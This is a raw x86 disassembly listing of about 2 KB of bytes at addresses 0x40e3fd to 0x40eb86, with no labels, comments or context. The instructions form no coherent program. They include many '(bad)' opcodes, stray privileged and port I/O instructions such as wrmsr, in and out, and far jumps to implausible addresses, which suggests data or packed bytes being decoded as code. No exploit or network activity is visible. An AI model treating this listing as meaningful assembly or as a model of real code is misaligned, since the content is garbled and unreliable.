  40e3fd:	rcr    BYTE PTR [ebp-0x676dcbce],1
  40e403:	test   eax,0x8bf18594
  40e408:	xchg   esp,eax
  40e409:	mov    al,0x64
  40e40b:	xor    dl,BYTE PTR [edi-0x3d2d0655]
  40e411:	les    ebp,FWORD PTR [edi-0x12]
  40e414:	push   0x7
  40e416:	bound  ebp,QWORD PTR [esp+edx*1]
  40e419:	outs   dx,DWORD PTR ds:[esi]
  40e41a:	jno    0x40e3ad
  40e41c:	out    dx,al
  40e41d:	and    DWORD PTR [edi],eax
  40e41f:	mov    esi,0xb2db8fd5
  40e424:	xor    BYTE PTR [ebx+0x711cf350],cl
  40e42a:	enter  0xc53,0x51
  40e42e:	(bad)  
  40e42f:	(bad)
  40e432:	sub    DWORD PTR [ebp+0x1],eax
  40e435:	mov    bh,0xa
  40e437:	retf   0x88fd
  40e43a:	das    
  40e43b:	(bad)  
  40e43c:	inc    esp
  40e43d:	stc    
  40e43e:	jae    0x40e47f
  40e440:	scas   eax,DWORD PTR es:[edi]
  40e441:	pop    ds
  40e442:	pop    edx
  40e443:	shl    BYTE PTR [edx+0x3e4d2841],cl
  40e449:	(bad)  
  40e44a:	jb     0x40e470
  40e44c:	jge    0x40e444
  40e44e:	fstp   TBYTE PTR [ebp+0xe6a2205]
  40e454:	or     BYTE PTR [edx-0x69],al
  40e457:	sub    DWORD PTR [ecx-0x61ac4e02],ecx
  40e45d:	fwait
  40e45e:	dec    eax
  40e45f:	jo     0x40e44d
  40e461:	add    DWORD PTR [edx+ebx*4+0x797047d2],esi
  40e468:	jnp    0x40e4bf
  40e46a:	jns    0x40e4aa
  40e46c:	pusha  
  40e46d:	sub    eax,0xf1c3eb37
  40e472:	inc    esp
  40e473:	enter  0x33cf,0xab
  40e477:	ss cmp al,0x97
  40e47a:	stos   BYTE PTR es:[edi],al
  40e47b:	lock test eax,0xeee9c115
  40e481:	xor    ah,BYTE PTR ds:0x70191970
  40e487:	fnsave ds:0xde2433b
  40e48d:	enter  0x79bc,0x18
  40e491:	sti    
  40e492:	or     DWORD PTR [esi-0x6b04cc3b],esi
  40e498:	and    BYTE PTR [ebx+esi*8-0x19],ch
  40e49c:	cmc    
  40e49d:	or     al,0x1c
  40e49f:	add    eax,0x7698c77f
  40e4a4:	cmp    BYTE PTR [ebx],0xe9
  40e4a7:	inc    edx
  40e4a8:	popa   
  40e4a9:	shl    BYTE PTR [eax],cl
  40e4ab:	outs   dx,BYTE PTR ds:[esi]
  40e4ac:	or     bl,bh
  40e4ae:	xchg   BYTE PTR [esp+ebp*4-0x779e833d],cl
  40e4b5:	xor    DWORD PTR [ebx+0x31c14536],0x4a17f091
  40e4bf:	add    edx,DWORD PTR [ebx+0x5e24b3e7]
  40e4c5:	(bad)  
  40e4c6:	fldcw  WORD PTR [edi-0x7034e1a6]
  40e4cc:	xor    al,0x1d
  40e4ce:	bound  ebp,QWORD PTR [edx]
  40e4d0:	cs into 
  40e4d2:	dec    ecx
  40e4d3:	pop    ecx
  40e4d4:	jmp    0xd874cd5e
  40e4d9:	ror    cl,cl
  40e4db:	xchg   edi,eax
  40e4dc:	dec    edi
  40e4dd:	inc    eax
  40e4de:	shl    BYTE PTR [ecx-0x6a79e867],0xdb
  40e4e5:	pop    es
  40e4e6:	loope  0x40e52e
  40e4e8:	je     0x40e4d7
  40e4ea:	xor    esp,DWORD PTR [ebp-0x44]
  40e4ed:	cs in  eax,dx
  40e4ef:	cmp    al,0xcd
  40e4f1:	je     0x40e4be
  40e4f3:	and    eax,0x8005d47c
  40e4f8:	jp     0x40e56e
  40e4fa:	imul   edi,edi,0x22bd62b6
  40e500:	les    edi,FWORD PTR [edx-0x583f4415]
  40e506:	mov    esp,0x834d7aae
  40e50b:	and    eax,0xd96e9d28
  40e510:	jp     0x40e53c
  40e512:	mov    WORD PTR [edx],?
  40e514:	ror    BYTE PTR [esi],1
  40e516:	scas   eax,DWORD PTR es:[edi]
  40e517:	sbb    DWORD PTR [esp+edx*1+0x12],esi
  40e51b:	sub    dh,al
  40e51d:	cmp    BYTE PTR [eax+0x34b7b694],cl
  40e523:	scas   al,BYTE PTR es:[edi]
  40e524:	(bad)  
  40e526:	retf   0xdf07
  40e529:	cmp    edi,eax
  40e52b:	xchg   ecx,eax
  40e52c:	cmp    al,0xac
  40e52e:	cdq    
  40e52f:	aam    0x5d
  40e531:	and    al,al
  40e533:	out    dx,eax
  40e534:	sbb    DWORD PTR [edi-0x44],0x9b7b0658
  40e53b:	dec    edi
  40e53c:	cmp    DWORD PTR [ebp+0x72e33f14],edx
  40e542:	cwde   
  40e543:	mov    edi,0x880dda0d
  40e548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e549:	mov    eax,ds:0x85260a9d
  40e54e:	daa    
  40e54f:	inc    ecx
  40e550:	adc    cl,BYTE PTR [ebx+0x56136ef1]
  40e556:	loopne 0x40e508
  40e558:	mov    WORD PTR [edi-0x55b23c5a],cs
  40e55e:	out    dx,al
  40e55f:	cs call 0xdc09f2f2
  40e565:	inc    ebx
  40e566:	lds    edi,FWORD PTR [ebx-0x5e]
  40e569:	cmp    cl,0x32
  40e56c:	and    eax,DWORD PTR ds:0x1ff974a4
  40e572:	sahf   
  40e573:	adc    bh,BYTE PTR [esi-0x2f2badcd]
  40e579:	rcl    BYTE PTR [ecx-0x21],1
  40e57c:	inc    edx
  40e57d:	idiv   DWORD PTR [edi-0x76]
  40e580:	pop    ss
  40e581:	rcr    BYTE PTR [ecx+esi*2+0x64],cl
  40e585:	(bad)  
  40e586:	mov    esi,0x6b8735d5
  40e58b:	les    esi,FWORD PTR [ebx-0x60]
  40e58e:	repnz call 0xdfe:0x65cf39c6
  40e596:	js     0x40e5de
  40e598:	mov    ebx,0xcda0a5e5
  40e59d:	jb     0x40e529
  40e59f:	div    BYTE PTR ds:0xb7ac363f
  40e5a5:	fstp   QWORD PTR ds:0xae46c4a6
  40e5ab:	xlat   BYTE PTR ds:[ebx]
  40e5ac:	mov    fs,WORD PTR [esi]
  40e5ae:	data16 sub al,0x5e
  40e5b1:	dec    edx
  40e5b2:	and    ah,BYTE PTR [ebx-0x1]
  40e5b5:	sub    eax,0x3aa31567
  40e5ba:	cmp    BYTE PTR [esi],0xb3
  40e5bd:	fwait
  40e5be:	push   es
  40e5bf:	scas   eax,DWORD PTR es:[edi]
  40e5c0:	jl     0x40e5a5
  40e5c2:	inc    ebp
  40e5c3:	and    bh,BYTE PTR [esi+0x57]
  40e5c6:	xor    BYTE PTR [edx+0x3a],ch
  40e5c9:	wrmsr  
  40e5cb:	and    al,0xb0
  40e5cd:	call   0xf228eb37
  40e5d2:	jl     0x40e5eb
  40e5d4:	(bad)  
  40e5d5:	pop    edx
  40e5d6:	cmp    DWORD PTR [ebp-0x76c300d5],ecx
  40e5dc:	aam    0x4f
  40e5de:	shl    BYTE PTR [edi-0x52c286da],0x34
  40e5e5:	add    al,0x5c
  40e5e7:	pop    esp
  40e5e8:	inc    ebp
  40e5e9:	imul   esp,DWORD PTR [ebx-0x40],0xffffff8b
  40e5ed:	out    0xd,eax
  40e5ef:	jbe    0x40e5a0
  40e5f1:	add    bl,ch
  40e5f3:	pop    ss
  40e5f4:	enter  0xff06,0xf1
  40e5f8:	xor    al,0x15
  40e5fa:	xor    DWORD PTR [eax-0x70],esi
  40e5fd:	xchg   ebx,eax
  40e5fe:	aam    0x6d
  40e600:	out    0xaf,al
  40e602:	cmc    
  40e603:	shl    DWORD PTR [ecx-0xb],1
  40e606:	(bad)  
  40e609:	and    DWORD PTR [eax-0x78],0xffffffa5
  40e60d:	pop    ds
  40e60e:	xor    eax,0x467e11b9
  40e613:	pop    eax
  40e614:	dec    edi
  40e615:	jmp    0x462c3b
  40e61a:	lahf   
  40e61b:	inc    ebx
  40e61c:	xchg   ebp,eax
  40e61d:	scas   al,BYTE PTR es:[edi]
  40e61e:	cdq    
  40e61f:	push   es
  40e620:	sbb    BYTE PTR [eax-0x2],bl
  40e623:	lock retf 
  40e625:	test   al,0x1c
  40e627:	enter  0x8e2d,0x8e
  40e62b:	gs aam 0xb6
  40e62e:	mov    BYTE PTR [eax-0x1f],ch
  40e631:	jmp    0xd527:0x5d66c82c
  40e638:	or     eax,0xb5e01e24
  40e63d:	retf   0x1af9
  40e640:	test   edi,esi
  40e642:	push   ecx
  40e643:	std    
  40e644:	and    eax,0x5ae8fa6f
  40e649:	mov    bh,0x65
  40e64b:	lahf   
  40e64c:	in     al,dx
  40e64d:	jns    0x40e5f9
  40e64f:	mov    ebp,0x6786a830
  40e654:	test   DWORD PTR [edx],eax
  40e656:	mov    eax,0x6c1bc9e4
  40e65b:	lock mov es,WORD PTR [edx]
  40e65e:	cmp    DWORD PTR [edx],eax
  40e660:	and    BYTE PTR [eax+0x7dc011c],dl
  40e666:	ins    DWORD PTR es:[edi],dx
  40e667:	xor    BYTE PTR [ebx+0x5d],0xd1
  40e66b:	add    bl,ch
  40e66d:	or     DWORD PTR [ecx+0x500c1641],0xffffffd8
  40e674:	lds    edx,FWORD PTR [ebp+0x33]
  40e677:	test   BYTE PTR [edx+eax*8+0x34cd3e86],0xd4
  40e67f:	inc    edx
  40e680:	sub    ebp,DWORD PTR [edi+0x4]
  40e683:	sub    ebp,DWORD PTR [ecx-0x49]
  40e686:	fist   DWORD PTR ds:0xa451a406
  40e68c:	fbld   TBYTE PTR [edx-0x64ff3551]
  40e692:	fwait
  40e693:	inc    esp
  40e694:	fist   DWORD PTR [edi]
  40e696:	cmp    eax,0x713df33d
  40e69b:	fimul  WORD PTR [ebx+0x4e4520e8]
  40e6a1:	repz cmp BYTE PTR [esi],cl
  40e6a4:	jmp    0xd53e:0x51d8e3dc
  40e6ab:	mov    ah,BYTE PTR [ecx+0x43]
  40e6ae:	int3   
  40e6af:	cmp    ah,dl
  40e6b1:	stos   BYTE PTR es:[edi],al
  40e6b2:	dec    bh
  40e6b4:	push   ebp
  40e6b5:	rcl    BYTE PTR [ebp+0x79382156],cl
  40e6bb:	mov    edi,0x6a9359c0
  40e6c0:	inc    esi
  40e6c1:	test   BYTE PTR [ecx-0x4e],al
  40e6c4:	inc    BYTE PTR [eax]
  40e6c6:	inc    eax
  40e6c7:	dec    edx
  40e6c8:	mov    ds:0xe3038bd4,eax
  40e6cd:	(bad)  
  40e6ce:	in     al,dx
  40e6cf:	(bad)  
  40e6d0:	mov    bl,0xff
  40e6d2:	jmp    0x557c8e04
  40e6d7:	xchg   edx,eax
  40e6d8:	test   eax,0x2f131b1a
  40e6dd:	cs loope 0x40e69b
  40e6e0:	sbb    bl,bh
  40e6e2:	dec    ebx
  40e6e3:	addr16 add ebp,edx
  40e6e6:	lods   eax,DWORD PTR ds:[esi]
  40e6e7:	mov    ebp,fs
  40e6e9:	sbb    ebx,edx
  40e6eb:	sbb    eax,0x55530bb9
  40e6f0:	mov    BYTE PTR [ecx+0x5a],bh
  40e6f3:	jl     0x40e6d9
  40e6f5:	add    DWORD PTR [edx+0xad62e0a],0xb57dbef0
  40e6ff:	cmp    al,0xf9
  40e701:	or     eax,0x5e0cb9b7
  40e706:	inc    ecx
  40e707:	arpl   WORD PTR [ebp+0x34],si
  40e70a:	xor    BYTE PTR [ebx],ch
  40e70c:	into   
  40e70d:	outs   dx,BYTE PTR ds:[esi]
  40e70e:	nop
  40e70f:	inc    esi
  40e710:	test   ecx,edx
  40e712:	mov    dl,0xbb
  40e714:	xchg   DWORD PTR [ebx],esi
  40e716:	inc    edi
  40e717:	scas   eax,DWORD PTR es:[edi]
  40e718:	mov    bl,0x9a
  40e71a:	jb     0x40e6eb
  40e71c:	imul   ebp,DWORD PTR [esi+0x34],0x16d5b733
  40e723:	xchg   ecx,eax
  40e724:	aam    0x69
  40e726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e727:	rcl    DWORD PTR [esi],cl
  40e729:	clc    
  40e72a:	mov    bl,0x34
  40e72c:	mov    eax,ds:0x4a6ef257
  40e731:	sbb    al,BYTE PTR ds:0x8c6ce93b
  40e737:	sahf   
  40e738:	stos   BYTE PTR es:[edi],al
  40e739:	xchg   ebp,eax
  40e73a:	inc    edx
  40e73b:	scas   eax,DWORD PTR es:[edi]
  40e73c:	xor    al,BYTE PTR [edi-0x89e4b63]
  40e742:	push   ebx
  40e743:	mov    al,0xba
  40e745:	jae    0x40e6e7
  40e747:	nop
  40e748:	mov    WORD PTR [ecx-0x4d904bd2],ds
  40e74e:	fwait
  40e74f:	and    BYTE PTR [edi+0xbfb3215],0x8d
  40e756:	imul   ebp,DWORD PTR [ebp-0x6946bf7c],0x7c0ee9e6
  40e760:	or     eax,0xb54ff01d
  40e765:	inc    edi
  40e766:	call   0xe596:0xcd7f1d1b
  40e76d:	mov    esp,0x697c5fd1
  40e772:	mov    dl,0x3
  40e774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e775:	push   cs
  40e776:	xlat   BYTE PTR ds:[ebx]
  40e777:	fist   WORD PTR [esp+edx*2+0x4]
  40e77b:	add    DWORD PTR cs:[ebx],ebx
  40e77e:	scas   eax,DWORD PTR es:[edi]
  40e77f:	retf   0x3f4b
  40e782:	out    0x19,eax
  40e784:	nop
  40e785:	push   edx
  40e786:	loope  0x40e71d
  40e788:	push   0x3bf4fd71
  40e78d:	out    dx,eax
  40e78e:	inc    esi
  40e78f:	add    edi,edi
  40e791:	inc    esi
  40e792:	and    eax,DWORD PTR ds:0x1a764dff
  40e798:	aaa    
  40e799:	out    0xaa,al
  40e79b:	pop    ebp
  40e79c:	out    0xce,al
  40e79e:	xchg   ebx,eax
  40e79f:	xor    al,0x9f
  40e7a1:	or     eax,0xc6fb5d7f
  40e7a6:	pop    ds
  40e7a7:	mov    cl,0x8b
  40e7a9:	cmp    eax,DWORD PTR [ebp-0x1f470708]
  40e7af:	into   
  40e7b0:	jg     0x40e762
  40e7b2:	test   eax,0x94f87da0
  40e7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b8:	outs   dx,DWORD PTR ds:[esi]
  40e7b9:	add    al,0x34
  40e7bb:	adc    dl,bh
  40e7bd:	dec    ebx
  40e7be:	lea    ebx,[edi+0x11]
  40e7c1:	cdq    
  40e7c2:	daa    
  40e7c3:	adc    BYTE PTR [esi-0x34],0xf3
  40e7c7:	fcom   QWORD PTR [esi]
  40e7c9:	sub    ebx,DWORD PTR [esp+ecx*1+0x7f9f2b9b]
  40e7d0:	retf   
  40e7d1:	mov    ds:0x17b46d51,eax
  40e7d6:	xchg   edx,eax
  40e7d7:	push   cs
  40e7d8:	fucomi st,st(7)
  40e7da:	xor    al,0x8c
  40e7dc:	in     al,dx
  40e7dd:	retf   
  40e7de:	int    0x9
  40e7e0:	ss sbb al,0xcb
  40e7e3:	pushf  
  40e7e4:	in     eax,0xfb
  40e7e6:	or     DWORD PTR ds:0x28bc3eb6,ecx
  40e7ec:	je     0x40e791
  40e7ee:	cmc    
  40e7ef:	adc    al,0xae
  40e7f1:	in     al,dx
  40e7f2:	xor    eax,0x68313cf6
  40e7f7:	pop    ebp
  40e7f8:	xchg   ecx,eax
  40e7f9:	mov    eax,ds:0x3660dc33
  40e7fe:	add    BYTE PTR [edi-0x3877b495],al
  40e804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e805:	outs   dx,BYTE PTR ds:[esi]
  40e806:	mov    BYTE PTR [edi-0x34],bh
  40e809:	test   al,0x71
  40e80b:	and    eax,eax
  40e80d:	shl    BYTE PTR [esi*4+0x612d53f9],cl
  40e814:	clc    
  40e815:	mov    esp,0xca603b30
  40e81a:	push   edi
  40e81b:	test   BYTE PTR [esi+0x2],dl
  40e81e:	dec    edx
  40e81f:	and    al,0x77
  40e821:	out    dx,eax
  40e822:	aad    0x7a
  40e824:	ror    ebx,cl
  40e826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e827:	jge    0x40e7c2
  40e829:	mov    dh,0xfb
  40e82b:	push   edi
  40e82c:	pushf  
  40e82d:	push   edi
  40e82e:	int    0x1f
  40e830:	repnz jecxz 0x40e874
  40e833:	loop   0x40e83d
  40e835:	pop    ebx
  40e836:	push   cs
  40e837:	sub    eax,0xc73611ef
  40e83c:	pop    edi
  40e83d:	sbb    eax,0x78fdc77a
  40e842:	ficomp DWORD PTR [edi-0x19ab2d07]
  40e848:	ret    
  40e849:	sub    DWORD PTR ds:0xb56240f,eax
  40e84f:	add    BYTE PTR [edi+ecx*8],ah
  40e852:	lods   al,BYTE PTR ds:[esi]
  40e853:	mov    dl,0x82
  40e855:	leave  
  40e856:	loopne 0x40e8a5
  40e858:	cld    
  40e859:	pop    ds
  40e85a:	sub    WORD PTR [edi-0x23],0x38b7
  40e860:	add    DWORD PTR [eax+0x60a7f380],ebp
  40e866:	xor    eax,0x7db55cb4
  40e86b:	add    dh,BYTE PTR [esp+eiz*8-0x19]
  40e86f:	jns    0x40e86c
  40e871:	adc    DWORD PTR [ebx+0x3c],esp
  40e874:	dec    esi
  40e875:	jbe    0x40e86b
  40e877:	fistp  DWORD PTR [ebx+0x68]
  40e87a:	inc    ecx
  40e87b:	sbb    eax,0xde0192e9
  40e880:	xor    DWORD PTR [ebx],ebx
  40e882:	sub    ebx,DWORD PTR [edx+0x6a]
  40e885:	and    al,0x57
  40e888:	fist   DWORD PTR [edi]
  40e88a:	das    
  40e88b:	push   es
  40e88c:	pop    ss
  40e88d:	add    edx,DWORD PTR ds:0xcf4ed402
  40e893:	in     eax,0xab
  40e895:	dec    ebp
  40e896:	jne    0x40e8a7
  40e898:	jecxz  0x40e8af
  40e89a:	imul   al
  40e89c:	fcomp  DWORD PTR [edx-0x6397464d]
  40e8a2:	jl     0x40e841
  40e8a4:	cmp    DWORD PTR [esi-0x19],ebx
  40e8a7:	jne    0x40e866
  40e8a9:	je     0x40e86c
  40e8ab:	icebp  
  40e8ac:	gs dec edx
  40e8ae:	in     al,0x19
  40e8b0:	add    eax,0xb6399204
  40e8b5:	or     DWORD PTR [ebx],edi
  40e8b7:	(bad)
  40e8bb:	fnstenv [eax+0x6d]
  40e8be:	scas   ax,WORD PTR es:[edi]
  40e8c0:	addr16 xor dl,dl
  40e8c3:	sbb    BYTE PTR [edx-0x9e3ec8c],bl
  40e8c9:	out    0x49,al
  40e8cb:	mov    edx,DWORD PTR [eax+0x591ffe02]
  40e8d1:	or     bh,0xd3
  40e8d4:	int3   
  40e8d5:	pop    ebp
  40e8d6:	aad    0x97
  40e8d8:	mov    ds:0x3128df50,al
  40e8dd:	push   edx
  40e8de:	fidivr DWORD PTR [ebx]
  40e8e0:	in     al,0x63
  40e8e2:	je     0x40e960
  40e8e4:	out    dx,eax
  40e8e5:	cmp    eax,0x87f94d4f
  40e8ea:	mov    al,ds:0x86b73f16
  40e8ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8f0:	mov    edx,edx
  40e8f2:	sbb    dh,BYTE PTR [edi]
  40e8f4:	push   ss
  40e8f5:	stos   BYTE PTR es:[edi],al
  40e8f6:	rcr    DWORD PTR [eax],0x56
  40e8f9:	mov    dh,0x7d
  40e8fb:	push   ecx
  40e8fc:	test   eax,0x64263dd4
  40e901:	lea    edx,ds:0x4a7e2053
  40e907:	pop    eax
  40e908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e909:	pusha  
  40e90a:	cwde   
  40e90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e90d:	dec    esi
  40e90e:	dec    ebx
  40e910:	pop    edi
  40e911:	xchg   ebx,eax
  40e912:	mov    ebx,0x67482e00
  40e917:	mov    ebx,0x4a774a37
  40e91c:	fcom   st(0)
  40e91e:	daa    
  40e91f:	sar    DWORD PTR [esp+ecx*2],0x5c
  40e923:	jb     0x40e90e
  40e925:	sub    BYTE PTR ds:0x28bf18e0,bl
  40e92b:	data16 in al,dx
  40e92d:	fcomp  st(3)
  40e92f:	mov    eax,0x9d3da112
  40e934:	out    dx,al
  40e935:	(bad)  
  40e936:	(bad)  
  40e938:	sub    ebp,DWORD PTR [ebp+ebx*1+0x7a04346c]
  40e93f:	mov    edi,esp
  40e941:	pusha  
  40e942:	cmp    al,0xb
  40e944:	mov    cl,0x6e
  40e946:	fmul   QWORD PTR [esi]
  40e948:	or     eax,0xea0c3e5d
  40e94d:	adc    eax,0x761a83d0
  40e952:	mov    BYTE PTR [edi+0x1b],cl
  40e955:	out    0x4,al
  40e957:	add    ecx,0xffffffbc
  40e95a:	shr    BYTE PTR [edx+ebp*1],1
  40e95d:	pushf  
  40e95e:	ja     0x40e926
  40e960:	mov    al,ds:0xcf5dde78
  40e965:	in     eax,dx
  40e966:	mov    edx,0x3b336c1b
  40e96b:	in     eax,0x3
  40e96d:	jl     0x40e942
  40e96f:	dec    ebx
  40e970:	jne    0x40e9ac
  40e972:	inc    ebx
  40e973:	pop    ebp
  40e974:	(bad)  
  40e975:	ds jl  0x40e945
  40e978:	retf   
  40e979:	jp     0x40e94b
  40e97b:	pop    edi
  40e97c:	repnz and dh,bh
  40e97f:	pop    edi
  40e980:	xor    DWORD PTR [esi+0x6f],0xffffffbb
  40e984:	mov    eax,ds:0x9a944e85
  40e989:	int3   
  40e98a:	and    DWORD PTR [ebx-0x1ba7fad7],esp
  40e990:	rol    DWORD PTR [eax],1
  40e992:	add    BYTE PTR [eax+0x27],bl
  40e995:	push   0xad2a0a0e
  40e99a:	mov    cl,0x96
  40e99c:	mov    ch,0x3f
  40e99e:	clc    
  40e99f:	aaa    
  40e9a0:	aas    
  40e9a1:	xchg   esi,eax
  40e9a2:	fnstcw WORD PTR [ecx]
  40e9a4:	mov    edx,0x70139e3d
  40e9a9:	fstp   DWORD PTR [ebx+edx*8]
  40e9ac:	mov    ch,0x2d
  40e9ae:	dec    ebx
  40e9af:	retf   0x12e3
  40e9b2:	inc    ebp
  40e9b3:	idiv   DWORD PTR [edx-0x14]
  40e9b6:	sbb    ebp,DWORD PTR [eax+eax*2+0x3aa29f6]
  40e9bd:	or     DWORD PTR [ebx],eax
  40e9bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9c0:	in     al,dx
  40e9c1:	fild   WORD PTR [ecx+ebx*2]
  40e9c4:	cmp    ebp,eax
  40e9c6:	pop    ecx
  40e9c7:	(bad)  
  40e9c8:	test   al,0x14
  40e9ca:	bound  esi,QWORD PTR [ebp-0x3c6e6131]
  40e9d0:	and    al,0xda
  40e9d2:	xor    BYTE PTR [edx+0x685226c4],dh
  40e9d8:	lods   eax,DWORD PTR ds:[esi]
  40e9d9:	imul   esi,esp,0xffffffdc
  40e9dc:	mov    eax,0xf1503e90
  40e9e1:	pop    edx
  40e9e2:	jnp    0x40e988
  40e9e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9e5:	icebp  
  40e9e6:	add    eax,0x8b2b70f
  40e9eb:	int    0x38
  40e9ed:	daa    
  40e9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ef:	outs   dx,DWORD PTR ds:[esi]
  40e9f0:	ss in  al,0x4
  40e9f3:	inc    ebx
  40e9f4:	lods   eax,DWORD PTR ds:[esi]
  40e9f5:	or     DWORD PTR [edx-0x64],0x67070a83
  40e9fc:	inc    edx
  40e9fd:	imul   edi,edx,0x1a
  40ea00:	in     eax,dx
  40ea01:	push   0xf39bdd83
  40ea06:	adc    DWORD PTR [eax-0x58],esi
  40ea09:	cwde   
  40ea0a:	hlt    
  40ea0b:	and    al,0xd9
  40ea0d:	fst    st(1)
  40ea0f:	mov    ?,WORD PTR [edi-0x34222c84]
  40ea15:	sar    BYTE PTR ds:0xa4026aff,1
  40ea1b:	mov    ah,0x78
  40ea1d:	mov    edi,eax
  40ea1f:	pushf  
  40ea20:	adc    al,0x34
  40ea22:	inc    eax
  40ea23:	mov    edx,0x15974c26
  40ea28:	sbb    dl,BYTE PTR [esi-0x62]
  40ea2b:	sbb    eax,0x30c3353e
  40ea30:	xor    DWORD PTR [edx-0x461e9adc],ecx
  40ea36:	mov    eax,ebx
  40ea38:	add    al,0xe7
  40ea3a:	mov    dh,0x6b
  40ea3c:	sbb    al,0x4
  40ea3e:	cmp    eax,0xd9481293
  40ea43:	mov    eax,0xbe71c633
  40ea48:	aaa    
  40ea49:	pop    edx
  40ea4a:	popf   
  40ea4b:	pop    esi
  40ea4c:	add    eax,0x6d030f85
  40ea51:	sub    eax,0xe552a66d
  40ea56:	leave  
  40ea57:	jle    0xfa8dcd19
  40ea5d:	cli    
  40ea5e:	les    eax,FWORD PTR [ecx+0x40]
  40ea61:	scas   al,BYTE PTR es:[edi]
  40ea62:	jmp    0xd39c:0x6601e4dd
  40ea69:	sbb    ecx,DWORD PTR [esp+ecx*2]
  40ea6c:	xor    al,bl
  40ea6e:	mov    ecx,0x46563820
  40ea73:	sbb    eax,0xf9414299
  40ea78:	les    ecx,FWORD PTR [ecx-0x5c]
  40ea7b:	mov    ah,0x89
  40ea7d:	mov    esp,0x43bf355c
  40ea82:	pop    ebp
  40ea83:	mov    eax,0x406b5a33
  40ea88:	jle    0x40ea55
  40ea8a:	je     0x40ead5
  40ea8c:	scas   eax,DWORD PTR es:[edi]
  40ea8d:	sbb    cl,BYTE PTR [edi]
  40ea8f:	es add al,0x85
  40ea92:	les    ebp,FWORD PTR [ebp-0x5c9f9211]
  40ea98:	jl     0x40ea64
  40ea9a:	in     al,0xdc
  40ea9c:	sahf   
  40ea9d:	dec    esi
  40ea9e:	mov    BYTE PTR [edi-0x36],al
  40eaa1:	ret    0xa9d7
  40eaa4:	jmp    0x40ea97
  40eaa6:	mov    ds:0xc9948ebe,al
  40eaab:	fnstenv [ecx]
  40eaad:	je     0x40eaed
  40eaaf:	inc    edi
  40eab0:	sub    DWORD PTR [ebx],eax
  40eab2:	mov    bh,0xa7
  40eab4:	sbb    ch,dh
  40eab6:	push   es
  40eab7:	ret    0x3679
  40eaba:	mov    dl,0x92
  40eabc:	jmp    0x40eab9
  40eabe:	(bad)  
  40eabf:	std    
  40eac0:	js     0x40ead0
  40eac2:	mov    ah,0x29
  40eac4:	inc    edx
  40eac5:	ins    DWORD PTR es:[edi],dx
  40eac6:	xchg   ecx,eax
  40eac7:	fdiv   DWORD PTR ds:0x2bc395bc
  40eacd:	outs   dx,BYTE PTR ds:[esi]
  40eace:	pop    esp
  40eacf:	fwait
  40ead0:	lea    edx,[ecx-0x12accc49]
  40ead6:	not    BYTE PTR ds:0x36dab117
  40eadc:	sahf   
  40eadd:	or     BYTE PTR [edi-0x76],ah
  40eae0:	icebp  
  40eae1:	push   cs
  40eae2:	cmp    bl,ch
  40eae4:	sbb    DWORD PTR [ebx-0x3],0xfffffffc
  40eae8:	push   edx
  40eae9:	and    cl,0x8a
  40eaec:	xor    ch,BYTE PTR [edx]
  40eaee:	test   DWORD PTR [ebp-0x75],ebx
  40eaf1:	cmp    al,0xe2
  40eaf3:	pop    ebp
  40eaf4:	push   ebx
  40eaf5:	xor    dh,cl
  40eaf7:	ficom  WORD PTR [edi]
  40eaf9:	retf   
  40eafa:	fdiv   DWORD PTR [edx+eax*2]
  40eafd:	pop    ds
  40eafe:	retf   
  40eaff:	outs   dx,DWORD PTR ds:[esi]
  40eb00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb01:	or     al,0xdd
  40eb03:	mov    dl,0xbe
  40eb05:	fcmovb st,st(6)
  40eb07:	into   
  40eb08:	je     0x40ead0
  40eb0a:	mov    BYTE PTR [ebx],al
  40eb0c:	xor    al,0xe5
  40eb0e:	xor    DWORD PTR [ebx],eax
  40eb10:	mov    DWORD PTR [edi+0x5b2488d9],eax
  40eb16:	fsub   QWORD PTR [esi+ebp*8]
  40eb19:	add    eax,0xece58179
  40eb1e:	push   edx
  40eb1f:	clc    
  40eb20:	jne    0x40eb23
  40eb22:	test   al,0xbd
  40eb24:	sub    ch,BYTE PTR [ebp+0x59]
  40eb27:	nop
  40eb28:	mov    es,WORD PTR [ebx]
  40eb2a:	aaa    
  40eb2b:	into   
  40eb2c:	test   eax,0x6853a98b
  40eb31:	daa    
  40eb32:	test   al,0xbd
  40eb34:	lahf   
  40eb35:	mov    dl,0x1b
  40eb37:	(bad)  
  40eb38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb39:	xchg   edi,eax
  40eb3a:	in     eax,0x62
  40eb3c:	in     eax,0x68
  40eb3e:	jge    0x40eb66
  40eb40:	push   ebx
  40eb41:	xor    eax,0xa08c2a46
  40eb46:	hlt    
  40eb47:	pop    ds
  40eb48:	xchg   BYTE PTR [ecx],ah
  40eb4a:	int3   
  40eb4b:	mov    cl,0xf6
  40eb4d:	(bad)  
  40eb4e:	mov    ebx,0xc1d05d9c
  40eb53:	adc    BYTE PTR [ebp-0x3b],bl
  40eb56:	dec    edx
  40eb57:	icebp  
  40eb58:	imul   esi,DWORD PTR ss:[eax+eax*1+0x5a],0x2e1e5aaf
  40eb61:	sti    
  40eb62:	icebp  
  40eb63:	or     BYTE PTR [edx+0x4a73f17],dh
  40eb69:	lea    esi,[eax]
  40eb6b:	dec    ebp
  40eb6c:	stc    
  40eb6d:	(bad)  
  40eb6e:	pop    edi
  40eb6f:	inc    ecx
  40eb70:	cdq    
  40eb71:	mov    cl,0x23
  40eb73:	cwde   
  40eb74:	(bad)  
  40eb75:	les    eax,FWORD PTR [ebp-0x41f71afa]
  40eb7b:	dec    ebx
  40eb7c:	cwde   
  40eb7d:	xchg   esp,eax
  40eb7e:	mov    al,0x58
  40eb80:	stos   DWORD PTR es:[edi],eax
  40eb81:	int3   
  40eb82:	int3   
  40eb83:	cmp    DWORD PTR [ebx+eiz*2],esi
  40eb86:	pop    eax
